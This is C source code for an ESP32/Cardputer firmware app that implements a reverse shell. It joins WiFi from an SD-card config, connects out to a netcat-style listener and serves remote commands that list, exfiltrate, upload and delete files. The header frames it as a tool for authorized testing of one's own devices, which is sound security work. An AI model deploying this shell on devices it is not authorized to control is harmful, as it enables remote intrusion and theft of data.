// Reverse Shell — connects the device to a WiFi network, then dials OUT to your
// listener (e.g. `nc -lvnp 4444`) and serves a remote command loop. For authorized
// testing on your own devices/networks only.
//
// Config is read from the SD card: /ext/apps_data/reverse_shell/config.txt
//   ssid=YourNetwork
//   password=YourPassword     (omit or leave blank for an open network)
//   host=192.168.1.100        (your listener's IP, or a hostname)
//   port=4444
//
// WiFi bring-up mirrors the wardriver app (esp_wifi STA); the TCP client mirrors
// wlan_app's socket usage (lwip). The shell runs ON the device — commands operate
// on the Cardputer, output is streamed back. If the listener is down/drops it
// retries every ~5s.
//
// Command set (typed at the listener, one per line):
//   help                 list commands
//   sysinfo              heap free, uptime, IP, model
//   ls [path]  (dir)     list an SD directory (default /ext)
//   cat <path> (get)     stream a file off the SD back to you  (exfil / "upload")
//   put <path>           write following lines to <path>, end with a lone "."
//   rm <path>            delete a file
//   mkdir <path>         create a directory
//   exit                 drop this connection (auto-reconnects after ~5s)

#include <furi.h>
#include <gui/gui.h>
#include <gui/view_dispatcher.h>
#include <gui/view.h>
#include <storage/storage.h>
#include <furi_hal_rtc.h>

#include <string.h>
#include <stdlib.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <esp_wifi.h>
#include <esp_netif.h>
#include <esp_event.h>
#include <esp_heap_caps.h>
#include <lwip/sockets.h>
#include <lwip/netdb.h>
#include <lwip/inet.h>
#include <errno.h>

#define TAG "reverse_shell"
#define RS_VIEW 0
#define RS_CFG_PATH EXT_PATH("apps_data/reverse_shell/config.txt")
#define RS_LINE_MAX 512
#define RS_IO_CHUNK 512

typedef enum {
    RsStateReadCfg,
    RsStateNoCfg,
    RsStateWifiInit,
    RsStateWifiFail,
    RsStateConnecting, // associating with AP
    RsStateDialing, // TCP connect to listener
    RsStateOnline, // shell session live
    RsStateRetry, // waiting to reconnect
} RsState;

typedef struct {
    ViewDispatcher* view_dispatcher;
    View* view;
    Gui* gui;

    Storage* storage;

    volatile bool running;
    volatile bool worker_alive;
    TaskHandle_t worker;
    FuriMutex* mutex;

    // config (from SD)
    char ssid[33];
    char password[65];
    char host[65];
    uint16_t port;

    // shared status (guarded by mutex)
    RsState state;
    uint32_t sessions; // successful listener connections
    uint32_t cmds; // commands executed this run
    char last_cmd[40];
    uint32_t ip; // our STA IP once associated
} ReverseShellApp;

// ── WiFi association state (set from the esp event handler) ──────────
static volatile bool s_wifi_got_ip = false;
static volatile bool s_wifi_disconnected = false;
static volatile uint32_t s_wifi_ip = 0;
static volatile bool s_auto_reconnect = false;

static void rs_wifi_event(void* arg, esp_event_base_t base, int32_t id, void* data) {
    UNUSED(arg);
    if(base == WIFI_EVENT && id == WIFI_EVENT_STA_DISCONNECTED) {
        s_wifi_got_ip = false;
        s_wifi_ip = 0;
        s_wifi_disconnected = true;
        if(s_auto_reconnect) esp_wifi_connect();
    } else if(base == IP_EVENT && id == IP_EVENT_STA_GOT_IP) {
        ip_event_got_ip_t* ev = (ip_event_got_ip_t*)data;
        s_wifi_ip = ev->ip_info.ip.addr;
        s_wifi_got_ip = true;
        s_wifi_disconnected = false;
    }
}

// ── small helpers ───────────────────────────────────────────────────
static void rs_set_state(ReverseShellApp* app, RsState st) {
    furi_mutex_acquire(app->mutex, FuriWaitForever);
    app->state = st;
    furi_mutex_release(app->mutex);
}

static void rs_trim(char* s) {
    // strip trailing CR/LF/space
    size_t n = strlen(s);
    while(n && (s[n - 1] == '\r' || s[n - 1] == '\n' || s[n - 1] == ' ' || s[n - 1] == '\t'))
        s[--n] = 0;
    // strip leading space
    char* p = s;
    while(*p == ' ' || *p == '\t') p++;
    if(p != s) memmove(s, p, strlen(p) + 1);
}

// ── config parse ────────────────────────────────────────────────────
static bool rs_read_config(ReverseShellApp* app) {
    app->ssid[0] = 0;
    app->password[0] = 0;
    app->host[0] = 0;
    app->port = 4444;

    File* f = storage_file_alloc(app->storage);
    bool ok = false;
    if(storage_file_open(f, RS_CFG_PATH, FSAM_READ, FSOM_OPEN_EXISTING)) {
        char buf[512];
        uint16_t n = storage_file_read(f, buf, sizeof(buf) - 1);
        buf[n] = 0;
        // parse key=value lines
        char* save = NULL;
        for(char* line = strtok_r(buf, "\r\n", &save); line;
            line = strtok_r(NULL, "\r\n", &save)) {
            char* eq = strchr(line, '=');
            if(!eq) continue;
            *eq = 0;
            char* key = line;
            char* val = eq + 1;
            rs_trim(key);
            rs_trim(val);
            if(strcmp(key, "ssid") == 0) {
                strncpy(app->ssid, val, sizeof(app->ssid) - 1);
            } else if(strcmp(key, "password") == 0 || strcmp(key, "pass") == 0) {
                strncpy(app->password, val, sizeof(app->password) - 1);
            } else if(strcmp(key, "host") == 0) {
                strncpy(app->host, val, sizeof(app->host) - 1);
            } else if(strcmp(key, "port") == 0) {
                int p = atoi(val);
                if(p > 0 && p < 65536) app->port = (uint16_t)p;
            }
        }
        ok = app->ssid[0] && app->host[0];
    }
    storage_file_close(f);
    storage_file_free(f);
    return ok;
}

// ── WiFi (STA) ──────────────────────────────────────────────────────
static bool rs_wifi_init(void) {
    if(esp_netif_init() != ESP_OK) return false;
    esp_event_loop_create_default(); // ok if already exists
    if(!esp_netif_get_handle_from_ifkey("WIFI_STA_DEF")) esp_netif_create_default_wifi_sta();

    esp_event_handler_register(WIFI_EVENT, ESP_EVENT_ANY_ID, &rs_wifi_event, NULL);
    esp_event_handler_register(IP_EVENT, IP_EVENT_STA_GOT_IP, &rs_wifi_event, NULL);

    // Trimmed buffers (mirror wlan_hal) to keep esp_wifi_init off NO_MEM.
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    cfg.static_rx_buf_num = 2;
    cfg.dynamic_rx_buf_num = 4;
    cfg.dynamic_tx_buf_num = 8;
    if(esp_wifi_init(&cfg) != ESP_OK) return false;
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_set_mode(WIFI_MODE_STA);
    if(esp_wifi_start() != ESP_OK) {
        esp_wifi_deinit();
        return false;
    }
    esp_wifi_set_max_tx_power(84); // 21 dBm ceiling for maximum range
    return true;
}

static void rs_wifi_stop(void) {
    s_auto_reconnect = false;
    esp_wifi_disconnect();
    esp_wifi_stop();
    esp_wifi_deinit();
    esp_event_handler_unregister(WIFI_EVENT, ESP_EVENT_ANY_ID, &rs_wifi_event);
    esp_event_handler_unregister(IP_EVENT, IP_EVENT_STA_GOT_IP, &rs_wifi_event);
}

// Associate and wait (up to ~15s) for an IP. Returns true on GOT_IP.
static bool rs_wifi_connect(ReverseShellApp* app) {
    s_wifi_got_ip = false;
    s_wifi_disconnected = false;

    wifi_config_t wc = {0};
    strncpy((char*)wc.sta.ssid, app->ssid, 32);
    if(app->password[0]) {
        strncpy((char*)wc.sta.password, app->password, 64);
        wc.sta.threshold.authmode = WIFI_AUTH_WPA_WPA2_PSK;
    } else {
        wc.sta.threshold.authmode = WIFI_AUTH_OPEN;
    }
    wc.sta.pmf_cfg.capable = false;
    wc.sta.pmf_cfg.required = false;
    s_auto_reconnect = true;
    esp_wifi_set_config(WIFI_IF_STA, &wc);
    if(esp_wifi_connect() != ESP_OK) return false;

    for(int i = 0; i < 150 && app->running; i++) {
        if(s_wifi_got_ip) {
            furi_mutex_acquire(app->mutex, FuriWaitForever);
            app->ip = s_wifi_ip;
            furi_mutex_release(app->mutex);
            return true;
        }
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    return false;
}

// ── socket I/O ──────────────────────────────────────────────────────
static bool rs_send_all(int sock, const char* buf, size_t len) {
    size_t off = 0;
    while(off < len) {
        int n = send(sock, buf + off, len - off, 0);
        if(n <= 0) return false;
        off += n;
    }
    return true;
}

static bool rs_send_str(int sock, const char* s) {
    return rs_send_all(sock, s, strlen(s));
}

// Read one '\n'-terminated line into out (NUL-terminated, CR/LF stripped).
// Returns false when the peer closes or errors. `stash`/`stash_len` carry
// bytes read past the newline between calls.
static bool rs_recv_line(
    int sock, char* out, size_t out_sz, char* stash, size_t* stash_len, volatile bool* running) {
    size_t pos = 0;
    while(*running) {
        // drain anything already stashed first
        while(*stash_len > 0) {
            char c = stash[0];
            memmove(stash, stash + 1, --(*stash_len));
            if(c == '\n') {
                out[pos] = 0;
                rs_trim(out);
                return true;
            }
            if(c != '\r' && pos < out_sz - 1) out[pos++] = c;
        }
        char tmp[RS_IO_CHUNK];
        int n = recv(sock, tmp, sizeof(tmp), 0);
        if(n > 0) {
            if((size_t)n > sizeof(tmp)) n = sizeof(tmp);
            memcpy(stash, tmp, n);
            *stash_len = n;
        } else if(n < 0 && (errno == EAGAIN || errno == EWOULDBLOCK || errno == EINTR)) {
            continue; // SO_RCVTIMEO fired: re-check *running and keep waiting
        } else {
            return false; // peer closed or hard error
        }
    }
    return false; // app is exiting — end the session
}

// ── on-device command handlers ──────────────────────────────────────
static void rs_cmd_help(int sock) {
    rs_send_str(
        sock,
        "commands:\r\n"
        "  help                 this list\r\n"
        "  sysinfo              heap/uptime/ip/model\r\n"
        "  ls [path]            list dir (default /ext)\r\n"
        "  cat <path>           stream a file back to you\r\n"
        "  put <path>           write lines to file, end with '.'\r\n"
        "  rm <path>            delete a file\r\n"
        "  mkdir <path>         make a directory\r\n"
        "  exit                 close (auto-reconnects)\r\n");
}

static void rs_cmd_sysinfo(ReverseShellApp* app, int sock) {
    uint32_t ip;
    uint32_t sess, cmds;
    furi_mutex_acquire(app->mutex, FuriWaitForever);
    ip = app->ip;
    sess = app->sessions;
    cmds = app->cmds;
    furi_mutex_release(app->mutex);

    char out[256];
    snprintf(
        out,
        sizeof(out),
        "model=Cardputer-ADV fw=flipper-esp32\r\n"
        "ip=%lu.%lu.%lu.%lu\r\n"
        "heap_free=%u largest=%u\r\n"
        "uptime_ms=%lu sessions=%lu cmds=%lu\r\n",
        (ip) & 0xFF,
        (ip >> 8) & 0xFF,
        (ip >> 16) & 0xFF,
        (ip >> 24) & 0xFF,
        (unsigned)heap_caps_get_free_size(MALLOC_CAP_INTERNAL),
        (unsigned)heap_caps_get_largest_free_block(MALLOC_CAP_INTERNAL),
        (unsigned long)furi_get_tick(),
        (unsigned long)sess,
        (unsigned long)cmds);
    rs_send_str(sock, out);
}

static void rs_cmd_ls(ReverseShellApp* app, int sock, const char* path) {
    const char* dir = (path && path[0]) ? path : EXT_PATH("");
    File* d = storage_file_alloc(app->storage);
    if(!storage_dir_open(d, dir)) {
        rs_send_str(sock, "err: cannot open dir\r\n");
        storage_file_free(d);
        return;
    }
    char name[256];
    FileInfo info;
    char line[300];
    while(storage_dir_read(d, &info, name, sizeof(name))) {
        int isdir = (info.flags & FSF_DIRECTORY) ? 1 : 0;
        snprintf(
            line,
            sizeof(line),
            "%s %8lu  %s\r\n",
            isdir ? "d" : "-",
            (unsigned long)(isdir ? 0 : info.size),
            name);
        if(!rs_send_str(sock, line)) break;
    }
    storage_dir_close(d);
    storage_file_free(d);
}

static void rs_cmd_cat(ReverseShellApp* app, int sock, const char* path) {
    if(!path || !path[0]) {
        rs_send_str(sock, "usage: cat <path>\r\n");
        return;
    }
    File* f = storage_file_alloc(app->storage);
    if(!storage_file_open(f, path, FSAM_READ, FSOM_OPEN_EXISTING)) {
        rs_send_str(sock, "err: cannot open file\r\n");
        storage_file_free(f);
        return;
    }
    char buf[RS_IO_CHUNK];
    uint16_t n;
    while((n = storage_file_read(f, buf, sizeof(buf))) > 0) {
        if(!rs_send_all(sock, buf, n)) break;
        if(n < sizeof(buf)) break; // short read = EOF
    }
    storage_file_close(f);
    storage_file_free(f);
    rs_send_str(sock, "\r\n");
}

static void rs_cmd_put(ReverseShellApp* app, int sock, const char* path, char* stash, size_t* stash_len) {
    if(!path || !path[0]) {
        rs_send_str(sock, "usage: put <path>  (then lines, end with '.')\r\n");
        return;
    }
    File* f = storage_file_alloc(app->storage);
    if(!storage_file_open(f, path, FSAM_WRITE, FSOM_CREATE_ALWAYS)) {
        rs_send_str(sock, "err: cannot create file\r\n");
        storage_file_free(f);
        return;
    }
    rs_send_str(sock, "receiving (end with '.') ...\r\n");
    char line[RS_LINE_MAX];
    while(rs_recv_line(sock, line, sizeof(line), stash, stash_len, &app->running)) {
        if(strcmp(line, ".") == 0) break;
        storage_file_write(f, line, strlen(line));
        storage_file_write(f, "\n", 1);
    }
    storage_file_sync(f);
    storage_file_close(f);
    storage_file_free(f);
    rs_send_str(sock, "saved\r\n");
}

static void rs_cmd_rm(ReverseShellApp* app, int sock, const char* path) {
    if(!path || !path[0]) {
        rs_send_str(sock, "usage: rm <path>\r\n");
        return;
    }
    rs_send_str(sock, storage_simply_remove(app->storage, path) ? "removed\r\n" : "err: rm failed\r\n");
}

static void rs_cmd_mkdir(ReverseShellApp* app, int sock, const char* path) {
    if(!path || !path[0]) {
        rs_send_str(sock, "usage: mkdir <path>\r\n");
        return;
    }
    rs_send_str(sock, storage_simply_mkdir(app->storage, path) ? "ok\r\n" : "err: mkdir failed\r\n");
}

// Dispatch one command line. Returns false if the session should end (exit).
static bool rs_dispatch(ReverseShellApp* app, int sock, char* line, char* stash, size_t* stash_len) {
    if(line[0] == 0) return true; // empty line, keep going

    furi_mutex_acquire(app->mutex, FuriWaitForever);
    app->cmds++;
    strncpy(app->last_cmd, line, sizeof(app->last_cmd) - 1);
    app->last_cmd[sizeof(app->last_cmd) - 1] = 0;
    furi_mutex_release(app->mutex);

    // split command / argument
    char* arg = strchr(line, ' ');
    if(arg) {
        *arg = 0;
        arg++;
        while(*arg == ' ') arg++;
    }
    const char* cmd = line;

    if(strcmp(cmd, "help") == 0 || strcmp(cmd, "?") == 0) {
        rs_cmd_help(sock);
    } else if(strcmp(cmd, "sysinfo") == 0 || strcmp(cmd, "id") == 0) {
        rs_cmd_sysinfo(app, sock);
    } else if(strcmp(cmd, "ls") == 0 || strcmp(cmd, "dir") == 0) {
        rs_cmd_ls(app, sock, arg);
    } else if(strcmp(cmd, "cat") == 0 || strcmp(cmd, "get") == 0 || strcmp(cmd, "pull") == 0) {
        rs_cmd_cat(app, sock, arg);
    } else if(strcmp(cmd, "put") == 0 || strcmp(cmd, "upload") == 0) {
        rs_cmd_put(app, sock, arg, stash, stash_len);
    } else if(strcmp(cmd, "rm") == 0 || strcmp(cmd, "del") == 0) {
        rs_cmd_rm(app, sock, arg);
    } else if(strcmp(cmd, "mkdir") == 0) {
        rs_cmd_mkdir(app, sock, arg);
    } else if(strcmp(cmd, "exit") == 0 || strcmp(cmd, "quit") == 0) {
        rs_send_str(sock, "bye\r\n");
        return false;
    } else {
        rs_send_str(sock, "unknown command; type 'help'\r\n");
    }
    return true;
}

// One full listener session: connect, banner, serve until the peer drops or
// sends `exit`. Returns after the socket closes.
static void rs_serve(ReverseShellApp* app) {
    struct sockaddr_in dst = {0};
    dst.sin_family = AF_INET;
    dst.sin_port = htons(app->port);

    // resolve host (accepts dotted-quad or hostname)
    dst.sin_addr.s_addr = inet_addr(app->host);
    if(dst.sin_addr.s_addr == INADDR_NONE) {
        struct hostent* he = gethostbyname(app->host);
        if(!he || !he->h_addr_list[0]) return; // unresolved; caller retries
        memcpy(&dst.sin_addr, he->h_addr_list[0], sizeof(struct in_addr));
    }

    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sock < 0) return;

    rs_set_state(app, RsStateDialing);
    if(connect(sock, (struct sockaddr*)&dst, sizeof(dst)) != 0) {
        close(sock);
        return; // listener down; caller retries
    }

    furi_mutex_acquire(app->mutex, FuriWaitForever);
    app->sessions++;
    app->state = RsStateOnline;
    furi_mutex_release(app->mutex);

    // Bound recv() so the worker periodically re-checks app->running and can exit
    // promptly on Back instead of parking forever on an idle-but-connected peer.
    struct timeval rcvtmo = {.tv_sec = 0, .tv_usec = 500000};
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &rcvtmo, sizeof(rcvtmo));

    char banner[96];
    snprintf(
        banner,
        sizeof(banner),
        "[+] Cardputer reverse shell online. 'help' for commands.\r\n%s",
        "> ");
    rs_send_str(sock, banner);

    char stash[RS_IO_CHUNK * 2];
    size_t stash_len = 0;
    char line[RS_LINE_MAX];
    while(app->running) {
        if(!rs_recv_line(sock, line, sizeof(line), stash, &stash_len, &app->running)) break;
        if(!rs_dispatch(app, sock, line, stash, &stash_len)) break;
        rs_send_str(sock, "> ");
    }
    close(sock);
}

static void rs_worker(void* ctx) {
    ReverseShellApp* app = ctx;

    rs_set_state(app, RsStateWifiInit);
    if(!rs_wifi_init()) {
        rs_set_state(app, RsStateWifiFail);
        app->worker_alive = false;
        vTaskDelete(NULL);
        return;
    }

    while(app->running) {
        // (re)associate if we don't have an IP
        if(!s_wifi_got_ip) {
            rs_set_state(app, RsStateConnecting);
            if(!rs_wifi_connect(app)) {
                rs_set_state(app, RsStateRetry);
                for(int i = 0; i < 50 && app->running; i++) vTaskDelay(pdMS_TO_TICKS(100));
                continue;
            }
        }

        rs_serve(app); // blocks for the session's lifetime

        if(!app->running) break;
        rs_set_state(app, RsStateRetry);
        for(int i = 0; i < 50 && app->running; i++) vTaskDelay(pdMS_TO_TICKS(100)); // ~5s
    }

    rs_wifi_stop();
    app->worker_alive = false;
    vTaskDelete(NULL);
}

// ── view ────────────────────────────────────────────────────────────
static const char* rs_state_str(RsState s) {
    switch(s) {
    case RsStateReadCfg: return "reading config";
    case RsStateNoCfg: return "NO CONFIG - see help";
    case RsStateWifiInit: return "wifi init";
    case RsStateWifiFail: return "WIFI INIT FAILED";
    case RsStateConnecting: return "joining wifi...";
    case RsStateDialing: return "dialing listener";
    case RsStateOnline: return "ONLINE";
    case RsStateRetry: return "retry in ~5s";
    default: return "?";
    }
}

static void rs_draw(Canvas* canvas, void* model) {
    ReverseShellApp* app = *(ReverseShellApp**)model;
    RsState st;
    uint32_t ip, sess, cmds;
    char host[65];
    char last[40];
    uint16_t port;
    furi_mutex_acquire(app->mutex, FuriWaitForever);
    st = app->state;
    ip = app->ip;
    sess = app->sessions;
    cmds = app->cmds;
    port = app->port;
    strncpy(host, app->host, sizeof(host));
    strncpy(last, app->last_cmd, sizeof(last));
    furi_mutex_release(app->mutex);

    canvas_clear(canvas);
    canvas_set_font(canvas, FontPrimary);
    canvas_draw_str(canvas, 2, 11, "Reverse Shell");
    canvas_set_font(canvas, FontSecondary);

    char buf[64];
    snprintf(buf, sizeof(buf), "%s", rs_state_str(st));
    canvas_draw_str(canvas, 2, 24, buf);

    if(ip) {
        snprintf(
            buf,
            sizeof(buf),
            "ip %lu.%lu.%lu.%lu",
            (unsigned long)(ip & 0xFF),
            (unsigned long)((ip >> 8) & 0xFF),
            (unsigned long)((ip >> 16) & 0xFF),
            (unsigned long)((ip >> 24) & 0xFF));
        canvas_draw_str(canvas, 2, 34, buf);
    }

    if(host[0]) {
        snprintf(buf, sizeof(buf), "-> %.40s:%u", host, port);
        canvas_draw_str(canvas, 2, 44, buf);
    }

    snprintf(buf, sizeof(buf), "sess:%lu cmds:%lu", (unsigned long)sess, (unsigned long)cmds);
    canvas_draw_str(canvas, 2, 54, buf);

    if(last[0]) {
        snprintf(buf, sizeof(buf), "<%s", last);
        canvas_draw_str(canvas, 2, 63, buf);
    } else {
        canvas_draw_str(canvas, 2, 63, "Back=exit");
    }
}

static bool rs_input(InputEvent* event, void* ctx) {
    ReverseShellApp* app = ctx;
    if(event->type == InputTypeShort && event->key == InputKeyBack) {
        view_dispatcher_stop(app->view_dispatcher);
        return true;
    }
    return false;
}

static void rs_tick(void* ctx) {
    ReverseShellApp* app = ctx;
    with_view_model(app->view, ReverseShellApp** m, { *m = app; }, true);
}

static ReverseShellApp* rs_alloc(void) {
    ReverseShellApp* app = malloc(sizeof(ReverseShellApp));
    if(!app) return NULL;
    memset(app, 0, sizeof(*app));
    app->mutex = furi_mutex_alloc(FuriMutexTypeNormal);
    app->state = RsStateReadCfg;
    app->port = 4444;
    app->storage = furi_record_open(RECORD_STORAGE);

    app->gui = furi_record_open(RECORD_GUI);
    app->view_dispatcher = view_dispatcher_alloc();
    view_dispatcher_attach_to_gui(app->view_dispatcher, app->gui, ViewDispatcherTypeFullscreen);
    view_dispatcher_set_event_callback_context(app->view_dispatcher, app);
    view_dispatcher_set_tick_event_callback(app->view_dispatcher, rs_tick, 500);

    app->view = view_alloc();
    view_allocate_model(app->view, ViewModelTypeLockFree, sizeof(ReverseShellApp*));
    with_view_model(app->view, ReverseShellApp** m, { *m = app; }, false);
    view_set_context(app->view, app);
    view_set_draw_callback(app->view, rs_draw);
    view_set_input_callback(app->view, rs_input);
    view_dispatcher_add_view(app->view_dispatcher, RS_VIEW, app->view);
    view_dispatcher_switch_to_view(app->view_dispatcher, RS_VIEW);
    return app;
}

static void rs_free(ReverseShellApp* app) {
    view_dispatcher_remove_view(app->view_dispatcher, RS_VIEW);
    view_free(app->view);
    view_dispatcher_free(app->view_dispatcher);
    furi_record_close(RECORD_GUI);
    if(app->storage) furi_record_close(RECORD_STORAGE);
    furi_mutex_free(app->mutex);
    free(app);
}

int32_t reverse_shell_app(void* p) {
    UNUSED(p);
    ReverseShellApp* app = rs_alloc();
    if(!app) return 0;

    // ensure the config dir exists, then read config
    storage_simply_mkdir(app->storage, EXT_PATH("apps_data"));
    storage_simply_mkdir(app->storage, EXT_PATH("apps_data/reverse_shell"));

    if(rs_read_config(app)) {
        app->running = true;
        app->worker_alive = true;
        if(xTaskCreate(rs_worker, "revshell", 8192, app, tskIDLE_PRIORITY + 4, &app->worker) !=
           pdPASS) {
            app->worker_alive = false;
            rs_set_state(app, RsStateWifiFail);
        }
    } else {
        rs_set_state(app, RsStateNoCfg);
    }

    view_dispatcher_run(app->view_dispatcher);

    // stop worker, wait for it to release wifi before freeing. The SO_RCVTIMEO on
    // the session socket makes the worker observe running=false within ~500ms and
    // exit; wait unconditionally rather than freeing after a fixed cap, which
    // would be a use-after-free if the worker were still in a blocking recv().
    // worker_alive is cleared before vTaskDelete, so this terminates.
    app->running = false;
    while(app->worker_alive) furi_delay_ms(20);

    rs_free(app);
    return 0;
}